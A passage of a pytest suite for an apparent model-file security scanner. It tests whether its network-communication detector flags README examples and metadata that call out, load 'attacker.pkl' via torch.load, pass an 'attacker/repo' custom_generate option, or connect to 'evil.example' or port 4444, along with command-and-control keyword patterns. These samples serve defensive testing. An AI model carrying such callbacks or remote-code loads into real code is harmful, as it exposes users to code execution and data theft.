            "model = AutoModel.from_pretrained('official/model')\n"
            f"{setup}"
            f"{generate_statement}"
            "```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(
            finding["type"] == "network_library" and finding["severity"] in {"HIGH", "CRITICAL"} for finding in findings
        )
        assert any(
            finding["type"] == "network_function" and finding["severity"] in {"HIGH", "CRITICAL"}
            for finding in findings
        )

    @pytest.mark.parametrize(
        "generate_statement",
        [
            ("if True:\n    processor = torch.load\n    model.generate(**processor('attacker.pkl'))\n"),
            "for processor in [torch.load]:\n    model.generate(**processor('attacker.pkl'))\n",
            "calls = [model.generate(**processor('attacker.pkl')) for processor in [torch.load]]\n",
            "calls = {model.generate(**processor('attacker.pkl')) for processor in [torch.load]}\n",
            "calls = {processor: model.generate(**processor('attacker.pkl')) for processor in [torch.load]}\n",
        ],
        ids=["if-assignment", "for-target", "list-comprehension", "set-comprehension", "dict-comprehension"],
    )
    def test_readme_python_example_rejects_inline_mapping_factory_shadowing(
        self,
        generate_statement: str,
    ) -> None:
        data = (
            "```python\nimport requests\nimport torch\nfrom PIL import Image\n"
            "from transformers import AutoModel, AutoProcessor\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            "processor = AutoProcessor.from_pretrained('official/model')\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"{generate_statement}"
            "```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        "generate_statement",
        [
            "if True:\n    model.generate(**processor(images=image, return_tensors='pt'))\n",
            "model.generate(**processor(images=image, return_tensors='pt'))\nprocessor = torch.load\n",
            "model.generate(**processor(images=image, return_tensors='pt')); processor = torch.load\n",
        ],
        ids=["nested-without-shadow", "eager-post-call-rebind", "same-line-eager-post-call-rebind"],
    )
    def test_readme_python_example_allows_unshadowed_inline_mapping_factory(
        self,
        generate_statement: str,
    ) -> None:
        data = (
            "```python\nimport requests\nimport torch\nfrom PIL import Image\n"
            "from transformers import AutoModel, AutoProcessor\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            "processor = AutoProcessor.from_pretrained('official/model')\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"{generate_statement}"
            "```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert all(finding["severity"] == "INFO" for finding in findings)
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        "processor_call",
        [
            (
                "processor_options = {'images': image, 'return_tensors': 'pt'}\n"
                "inputs = processor(**processor_options)\n"
            ),
            "inputs = processor(**{'images': image, 'return_tensors': 'pt'})\n",
        ],
        ids=["named-mapping", "literal-mapping"],
    )
    def test_readme_python_example_allows_static_processor_kwargs_unpacking(self, processor_call: str) -> None:
        """Canonical processor options may be unpacked from a statically safe mapping."""
        data = (
            "```python\nimport requests\nfrom PIL import Image\n"
            "from transformers import AutoModel, AutoProcessor\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            "processor = AutoProcessor.from_pretrained('official/model')\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"{processor_call}"
            "model.generate(**inputs)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert all(finding["severity"] == "INFO" for finding in findings)
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        ("factory_name", "instance_name", "inputs_expression"),
        [
            ("AutoTokenizer", "tokenizer", "tokenizer('hello', return_tensors='pt')"),
            ("BertTokenizerFast", "tokenizer", "tokenizer('hello', return_tensors='pt')"),
            (
                "AutoFeatureExtractor",
                "feature_extractor",
                "feature_extractor(images=image, return_tensors='pt')",
            ),
            (
                "AutoProcessor",
                "processor",
                "processor(images=image, return_tensors='pt').to('cpu')",
            ),
        ],
        ids=["auto-tokenizer", "fast-tokenizer", "feature-extractor", "processor-to-cpu"],
    )
    def test_readme_python_example_allows_trusted_transformers_mapping_factories(
        self,
        factory_name: str,
        instance_name: str,
        inputs_expression: str,
    ) -> None:
        """Canonical Transformers input factories produce trusted model-input mappings."""
        data = (
            "```python\nimport requests\nfrom PIL import Image\n"
            f"from transformers import AutoModel, {factory_name}\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            f"{instance_name} = {factory_name}.from_pretrained('official/model')\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"inputs = {inputs_expression}\n"
            "model.generate(**inputs)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert all(finding["severity"] == "INFO" for finding in findings)
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        "inputs_setup",
        [
            ("device = 'cpu'; inputs = processor(images=image, return_tensors='pt').to(device)\n"),
            ("inputs = processor(images=image, return_tensors='pt').to(device='cuda')\n"),
            ("inputs = processor(images=image, return_tensors='pt'); inputs = inputs.to('cpu')\n"),
        ],
        ids=["named-device", "keyword-device", "mapping-rebind"],
    )
    def test_readme_python_example_allows_ordered_mapping_device_transfers(self, inputs_setup: str) -> None:
        """A unique device literal and provenance-preserving rebinding remain canonical."""
        data = (
            "```python\nimport requests\nfrom PIL import Image\n"
            "from transformers import AutoModel, AutoProcessor\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            "processor = AutoProcessor.from_pretrained('official/model')\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"{inputs_setup}"
            "model.generate(**inputs)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert all(finding["severity"] == "INFO" for finding in findings)
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_readme_python_example_allows_standalone_mapping_device_transfer(self) -> None:
        """BatchEncoding.to mutates the proven mapping without replacing it."""
        data = (
            b"```python\nimport requests\nfrom PIL import Image\n"
            b"from transformers import AutoModel, AutoProcessor\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"image = Image.open(requests.get(image_url, stream=True).raw)\n"
            b"processor = AutoProcessor.from_pretrained('official/model')\n"
            b"model = AutoModel.from_pretrained('official/model')\n"
            b"inputs = processor(images=image, return_tensors='pt')\n"
            b"inputs.to('cuda')\n"
            b"model.generate(**inputs)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert all(finding["severity"] == "INFO" for finding in findings)
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        "transfer",
        [
            "inputs.to(image.mode)\n",
            "inputs.to('cpu', 'cuda')\n",
            "print(inputs.to('cuda'))\n",
        ],
        ids=["dynamic-device", "extra-device", "leaked-transfer-result"],
    )
    def test_readme_python_example_rejects_unsafe_standalone_mapping_device_transfer(
        self,
        transfer: str,
    ) -> None:
        data = (
            "```python\nimport requests\nfrom PIL import Image\n"
            "from transformers import AutoModel, AutoProcessor\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            "processor = AutoProcessor.from_pretrained('official/model')\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            "inputs = processor(images=image, return_tensors='pt')\n"
            f"{transfer}"
            "model.generate(**inputs)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_python_example_allows_tokenizer_output_on_trusted_model_device(self) -> None:
        """A uniquely bound Transformers model provides a canonical tensor device."""
        data = (
            b"```python\nimport requests\n"
            b"from transformers import AutoModelForCausalLM, AutoTokenizer\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"tokenizer = AutoTokenizer.from_pretrained('official/model')\n"
            b"model = AutoModelForCausalLM.from_pretrained('official/model')\n"
            b"inputs = tokenizer('hello', return_tensors='pt').to(model.device)\n"
            b"model.generate(**inputs)\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert findings
        assert all(finding["severity"] == "INFO" for finding in findings)
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        ("provider_setup", "device_expression"),
        [
            ("provider = image\n", "provider.device"),
            ("model = image; ", "model.device"),
        ],
        ids=["arbitrary-provider", "same-line-model-rebind"],
    )
    def test_readme_python_example_rejects_untrusted_model_device_provider(
        self,
        provider_setup: str,
        device_expression: str,
    ) -> None:
        data = (
            "```python\nimport requests\nfrom PIL import Image\n"
            "from transformers import AutoModelForCausalLM, AutoTokenizer\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            "tokenizer = AutoTokenizer.from_pretrained('official/model')\n"
            "model = AutoModelForCausalLM.from_pretrained('official/model')\n"
            f"{provider_setup}"
            f"inputs = tokenizer('hello', return_tensors='pt').to({device_expression})\n"
            "model.generate(**inputs)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_python_example_rejects_same_line_mapping_factory_rebind(self) -> None:
        """A same-line callee rebind must invalidate trusted mapping-factory provenance."""
        data = (
            b"```python\nimport requests\nimport torch\nfrom PIL import Image\n"
            b"from transformers import AutoModel, AutoProcessor\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"image = Image.open(requests.get(image_url, stream=True).raw)\n"
            b"processor = AutoProcessor.from_pretrained('official/model')\n"
            b"model = AutoModel.from_pretrained('official/model')\n"
            b"processor = torch.load; inputs = processor('attacker.pkl')\n"
            b"model.generate(**inputs)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        ("processor_binding", "inputs_binding"),
        [
            (
                "processor = AutoModel.from_pretrained('official/model')\n",
                "inputs = processor(images=image, return_tensors='pt')\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "processor_options = {\n"
                "    'images': image,\n"
                "    'return_tensors': 'pt',\n"
                "    'custom_generate': 'attacker/repo',\n"
                "}\n"
                "inputs = processor(**processor_options)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "processor_key = 'images'\n"
                "processor_options = {processor_key: image, 'return_tensors': 'pt'}\n"
                "inputs = processor(**processor_options)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "processor_options = {'images': image}\n"
                "processor_options = {'images': image, 'return_tensors': 'pt'}\n"
                "inputs = processor(**processor_options)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "processor_options = {'images': image}\n"
                "alias = processor_options\n"
                "alias |= {'return_tensors': 'pt'}\n"
                "inputs = processor(**processor_options)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "processor_options = image\ninputs = processor(**processor_options)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "inputs = processor(images=image, return_tensors='pt')\n"
                "alias = inputs\n"
                "alias |= {'custom_generate': 'attacker/repo'}\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "inputs = processor(*[image], return_tensors='pt')\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "inputs = processor(images=image, return_tensors='pt', trust_remote_code=True)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "inputs = processor(images=image, return_tensors='pt').to('cpu').tolist()\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "device = image.mode\ninputs = processor(images=image, return_tensors='pt').to(device)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "device = image.mode\ninputs = processor(images=image, return_tensors='pt').to(device=device)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "inputs = processor(images=image, return_tensors='pt').to('cpu', 'cuda')\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "inputs = processor(images=image, return_tensors='pt').to(device='cuda', non_blocking=True)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "device = 'cpu'; device = 'cuda'; inputs = processor(images=image, return_tensors='pt').to(device)\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "inputs = processor(images=image, return_tensors='pt')\n"
                "inputs = {'custom_generate': 'attacker/repo'}\n"
                "inputs = inputs.to('cpu')\n",
            ),
            (
                "processor = AutoProcessor.from_pretrained('official/model')\n",
                "inputs = processor(images=image, return_tensors='pt')\n"
                "def inputs():\n"
                "    return {'custom_generate': 'attacker/repo'}\n"
                "inputs = inputs.to('cpu')\n",
            ),
        ],
        ids=[
            "non-processor-factory",
            "dynamic-processor-options",
            "computed-processor-key",
            "rebound-processor-options",
            "mutated-processor-options-alias",
            "unproven-processor-options",
            "mutated-processor-output",
            "starred-processor-arguments",
            "remote-code-processor-option",
            "arbitrary-method-chain",
            "dynamic-device-transfer",
            "dynamic-keyword-device-transfer",
            "extra-positional-device-transfer",
            "extra-keyword-device-transfer",
            "rebound-device-transfer",
            "malicious-mapping-rebind",
            "function-mapping-rebind",
        ],
    )
    def test_readme_python_example_rejects_unproven_processor_generate_kwargs(
        self,
        processor_binding: str,
        inputs_binding: str,
    ) -> None:
        data = (
            "```python\nimport requests\nfrom PIL import Image\n"
            "from transformers import AutoModel, AutoProcessor\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
            f"{processor_binding}"
            "model = AutoModel.from_pretrained('official/model')\n"
            f"{inputs_binding}"
            "model.generate(**inputs)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    @pytest.mark.parametrize(
        "model_call",
        [
            "AutoModel.from_pretrained('official/model', **{'revision': 'main'})",
            "AutoModel.from_pretrained('official/model', **{'trust_remote_code': False})",
            "model.generate(custom_generate=None)",
            "model.generate(**{'custom_generate': None})",
            "safe_options = {'custom_generate': None}\nmodel.generate(**safe_options)",
            ("safe_options = {'custom_generate': None}\nalias = safe_options\nmodel.generate(**alias)"),
            ("safe_options = {'custom_generate': None}\nalias: 'mapping' = safe_options\nmodel.generate(**alias)"),
            (
                "safe_options = {'custom_generate': None}\n"
                "first_alias = safe_options\n"
                "alias = first_alias\n"
                "model.generate(**alias)"
            ),
            ("alias = safe_options = {'custom_generate': None}\nmodel.generate(**alias)"),
        ],
    )
    def test_readme_python_example_allows_proven_safe_remote_code_options(self, model_call: str) -> None:
        model_setup = (
            "" if model_call.startswith("AutoModel") else "model = AutoModel.from_pretrained('official/model')\n"
        )
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            f"{model_setup}{model_call}\n"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        "post_call_operation",
        [
            "copied = options['custom_generate']\n",
            "for options['custom_generate'] in ['attacker/repo']:\n    pass\n",
            "options = {'custom_generate': 'attacker/repo'}\n",
            "alias = options\nalias |= {'custom_generate': 'attacker/repo'}\n",
        ],
        ids=["read", "mutation", "rebind", "aliased-augmented-mutation"],
    )
    def test_readme_python_example_allows_safe_options_used_before_later_operations(
        self,
        tmp_path: Path,
        post_call_operation: str,
    ) -> None:
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            "options = {'custom_generate': None}\n"
            "model.generate(**options)\n"
            f"{post_call_operation}"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()
        readme_path = tmp_path / "README.md"
        readme_path.write_bytes(data)

        findings = NetworkCommDetector().scan(data, readme_path.name)
        aggregate = scan_model_directory_or_file(str(readme_path), cache_enabled=False)

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
        assert determine_exit_code(aggregate) == 0

    @pytest.mark.parametrize(
        ("deferred_setup", "consume_deferred"),
        [
            (
                "pending = (model.generate(**options) for _ in range(1))\n",
                "for _ in pending:\n    pass\n",
            ),
            ("pending = lambda: model.generate(**options)\n", ""),
            ("def pending():\n    return model.generate(**options)\n", ""),
            ("async def pending():\n    return model.generate(**options)\n", ""),
        ],
        ids=["generator-expression", "lambda", "function", "async-function"],
    )
    def test_readme_python_example_rejects_deferred_generate_after_later_rebind(
        self,
        tmp_path: Path,
        deferred_setup: str,
        consume_deferred: str,
    ) -> None:
        data = (
            "```python\nimport requests\nfrom transformers import AutoModel\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "model = AutoModel.from_pretrained('official/model')\n"
            "options = {'custom_generate': None}\n"
            f"{deferred_setup}"
            "options = {'custom_generate': 'attacker/repo'}\n"
            f"{consume_deferred}"
            "requests.get(image_url, stream=True)\n```\n"
        ).encode()
        readme_path = tmp_path / "README.md"
        readme_path.write_bytes(data)

        findings = NetworkCommDetector().scan(data, readme_path.name)
        aggregate = scan_model_directory_or_file(str(readme_path), cache_enabled=False)

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)
        assert determine_exit_code(aggregate) == 1

    def test_readme_python_example_allows_explicitly_disabled_remote_code_trust(self) -> None:
        data = (
            b"```python\nimport requests\nfrom transformers import AutoModel\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"AutoModel.from_pretrained('official/model', trust_remote_code=False)\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize(
        "additional_fence",
        [
            "```python\n# requests powers our image download\nprint('ok')\n```\n",
            "```python\nprint('this example uses requests')\n```\n",
        ],
    )
    def test_readme_official_image_ignores_nonexecutable_requests_mentions(self, additional_fence: str) -> None:
        data = (
            "```python\nimport requests\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "requests.get(image_url, stream=True)\n```\n"
            f"{additional_fence}"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    @pytest.mark.parametrize("outside_request", ["requests.patch(input())\n", "```\nrequests.patch(input())\n```\n"])
    def test_readme_official_image_preserves_requests_outside_validated_python_fence(
        self,
        outside_request: str,
    ) -> None:
        data = (
            "```python\nimport requests\n"
            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            "requests.get(image_url, stream=True)\n```\n"
            f"{outside_request}"
        ).encode()

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)

    def test_official_sample_image_does_not_suppress_executable_python(self) -> None:
        data = (
            b"import requests\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"requests.get(image_url, stream=True)\n"
        )

        findings = NetworkCommDetector().scan(data, "example.py")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_official_sample_image_requires_requests_import_before_call(self) -> None:
        data = (
            b"```python\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"requests.get(image_url, stream=True)\n"
            b"import requests\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_large_readme_keeps_bounded_official_sample_image_example(self) -> None:
        data = (
            (b"Documentation prose.\n" * 4000)
            + b"```python\nimport requests\n"
            + b"url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            + b"requests.get(url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_readme_official_image_example_is_validated_once_per_fence(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        validated_examples: list[bytes] = []
        original_validator = network_comm._is_valid_official_readme_sample_image_example

        def count_validation(example: bytes) -> bool:
            validated_examples.append(example)
            return original_validator(example)

        monkeypatch.setattr(network_comm, "_is_valid_official_readme_sample_image_example", count_validation)
        data = (
            b"```python\nimport requests\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            + b"# requests.get is documented here\n" * 64
            + b"requests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert len(validated_examples) == 1
        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_readme_official_image_example_stops_at_bounded_ast_node_limit(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        visited_nodes: list[int] = []

        def oversized_ast_walk(_tree: network_comm.ast.AST) -> Iterator[network_comm.ast.AST]:
            for index in range(network_comm._MAX_README_IMAGE_EXAMPLE_AST_NODES + 50):
                visited_nodes.append(index)
                yield network_comm.ast.Pass()

        monkeypatch.setattr(network_comm.ast, "walk", oversized_ast_walk)

        assert not network_comm._is_valid_official_readme_sample_image_example(
            b"import requests\nrequests.get('https://huggingface.co/org/model/resolve/main/sample.png', stream=True)\n"
        )
        assert len(visited_nodes) == network_comm._MAX_README_IMAGE_EXAMPLE_AST_NODES + 1

    def test_readme_official_image_example_rejects_excessive_fence_openings(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        closing_searches: list[int] = []
        original_pattern = network_comm._README_FENCE_END_PATTERN

        class CountedClosingPattern:
            def search(self, data: bytes, start: int, end: int) -> re.Match[bytes] | None:
                closing_searches.append(start)
                return original_pattern.search(data, start, end)

        monkeypatch.setattr(network_comm, "_README_FENCE_END_PATTERN", CountedClosingPattern())
        data = (
            b"```python\n" * (network_comm._MAX_README_IMAGE_EXAMPLE_FENCE_OPENINGS + 1)
            + b"import requests\nrequests.get(image_url, stream=True)\n"
        )

        assert not network_comm._is_official_readme_sample_image_request(
            data,
            match_index=data.index(b"requests.get"),
            context="README.md",
            fence_cache=[],
        )
        assert not closing_searches

    def test_readme_official_image_in_different_fence_does_not_suppress_network_call(self) -> None:
        data = (
            b"```python\nimage_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n```\n"
            b"```python\nimport requests\nrequests.get(image_url, stream=True)\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)
        assert any(finding["type"] == "network_function" for finding in findings)

    def test_readme_official_image_does_not_suppress_requests_in_another_fence(self) -> None:
        data = (
            b"```python\nimport requests\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"requests.get(image_url, stream=True)\n```\n"
            b"```python\nrequests.patch(input())\n```\n"
        )

        findings = NetworkCommDetector().scan(data, "README.md")

        assert any(finding["type"] == "network_library" for finding in findings)

    def test_readme_official_image_fence_index_stays_bounded(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        validated_examples: list[bytes] = []
        original_validator = network_comm._is_valid_official_readme_sample_image_example

        def count_validation(example: bytes) -> bool:
            validated_examples.append(example)
            return original_validator(example)

        monkeypatch.setattr(network_comm, "_is_valid_official_readme_sample_image_example", count_validation)
        example = (
            b"```python\nimport requests\n"
            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
            b"requests.get(image_url, stream=True)\n```\n"
        )
        data = example * (network_comm._MAX_README_IMAGE_EXAMPLE_FENCES + 1)

        findings = NetworkCommDetector().scan(data, "README.md")

        assert len(validated_examples) == network_comm._MAX_README_IMAGE_EXAMPLE_FENCES
        assert any(finding["type"] == "network_library" for finding in findings)

    def test_network_function_with_parentheses_still_flagged_in_metadata_context(self) -> None:
        """Executable-looking calls should stay detectable even when embedded in metadata files."""
        detector = NetworkCommDetector()
        data = b'socket.connect(("api.example", 4444))'

        findings = detector.scan(data, "metadata.json")

        func_findings = [finding for finding in findings if finding["type"] == "network_function"]
        assert any(finding["function"] == "socket.connect" for finding in func_findings)

    def test_network_function_after_doc_token_still_flagged(self) -> None:
        """A prose token mention should not hide a later executable-looking function call."""
        detector = NetworkCommDetector()
        data = b'This README says requests.get is shown for examples.\nrequests.get("https://evil.example")'

        findings = detector.scan(data, "metadata.json")

        func_findings = [finding for finding in findings if finding["type"] == "network_function"]
        assert any(finding["function"] == "requests.get" for finding in func_findings)

    def test_network_library_with_realistic_prose_context_not_flagged(self) -> None:
        """Import-like words in prose should not be treated as network imports."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes import socket for demos and troubleshooting examples."

        findings = detector.scan(data, "README.txt")

        assert not [finding for finding in findings if finding["type"] == "network_library"]

    def test_executable_metadata_named_path_still_flags_network_import(self) -> None:
        """Executable paths containing metadata-like words should not be treated as prose."""
        detector = NetworkCommDetector()
        data = b"import socket  # used by this metadata helper to open outbound connections"

        findings = detector.scan(data, "src/metadata_utils.py")

        assert any(finding["type"] == "network_library" for finding in findings)

    def test_metadata_context_without_prose_marker_still_flags_network_import(self) -> None:
        """Metadata filenames alone should not suppress executable-looking imports."""
        detector = NetworkCommDetector()
        data = b'{"hook": "import socket then send payload"}'

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_metadata_context_with_marker_in_structured_hook_still_flags_network_import(self) -> None:
        """Marker words in structured metadata should not hide executable import text."""
        detector = NetworkCommDetector()
        data = b'{"hook": "import socket includes callback"}'

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_inline_comment_prose_marker_after_code_still_flags_network_import(self) -> None:
        """Inline prose markers should not hide executable import statements."""
        detector = NetworkCommDetector()
        data = b"if True: import socket  # for outbound callback"

        findings = detector.scan(data, "model.pkl")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_inline_compound_statement_with_prose_marker_still_flags_network_import(self) -> None:
        """Compound statements should stay executable even when comments look prose-like."""
        detector = NetworkCommDetector()
        data = b"for _ in [0]: import socket  # examples"

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_newline_free_binary_prose_marker_does_not_hide_later_import(self) -> None:
        """A prose marker far away in a binary blob should not suppress a later import token."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes examples " + (b"x" * 600) + b"import socket"

        findings = detector.scan(data, "model.pkl")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_network_library_after_doc_import_still_flagged(self) -> None:
        """A prose import mention should not hide a later executable import."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes import socket for demos and troubleshooting examples.\nimport socket"

        findings = detector.scan(data, "README.txt")

        lib_findings = [finding for finding in findings if finding["type"] == "network_library"]
        assert any(finding["library"] == "socket" for finding in lib_findings)

    def test_detect_cc_patterns(self) -> None:
        """Test detection of command & control patterns."""
        detector = NetworkCommDetector()

        data = b"""
        beacon_url = "http://c2.server.com"
        callback_url = config['server']
        malware_config = {"backdoor": True}
        botnet_id = "zombie123"
        """

        findings = detector.scan(data)
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]

        assert len(cc_findings) >= 4

        # All C&C patterns should be critical
        assert all(f["severity"] == "CRITICAL" for f in cc_findings)

        # Check specific patterns
        patterns = [f["pattern"] for f in cc_findings]
        assert "beacon_url" in patterns
        assert "malware" in patterns
        assert "backdoor" in patterns
        assert "botnet" in patterns
        assert all(finding.get("position") == data.lower().find(finding["pattern"].encode()) for finding in cc_findings)

    def test_cc_pattern_scan_reuses_lowered_payload(self) -> None:
        """Reuse one lowercase payload view across all C&C pattern checks."""

        class TrackingBytes(bytes):
            lower_calls = 0

            def lower(self) -> bytes:
                self.lower_calls += 1
                return super().lower()

        detector = NetworkCommDetector()
        data = TrackingBytes(b'payload = {"malware": True, "backdoor": True}')

        detector._scan_cc_patterns(data, "payload.bin")

        assert data.lower_calls == 1
        assert {finding["pattern"] for finding in detector.findings} >= {"malware", "backdoor"}

    def test_benign_metadata_reference_keys_are_not_cc_patterns(self) -> None:
        """Common model metadata URL keys are not C&C indicators by themselves."""
        detector = NetworkCommDetector()

        data = b"""
        {
            "download_url": "https://huggingface.co/example/model",
            "report_url": "https://huggingface.co/example/model/blob/main/README.md",
            "telemetry_endpoint": "disabled",
            "heartbeat_interval": 30,
            "keepalive": true,
            "update_server": "none",
            "upload_endpoint": "none"
        }
        """

        findings = detector.scan(data)
        cc_patterns = {f["pattern"] for f in findings if f["type"] == "cc_pattern"}

        assert cc_patterns.isdisjoint(
            {
                "download_url",
                "report_url",
                "telemetry_endpoint",
                "heartbeat",
                "keepalive",
                "update_server",
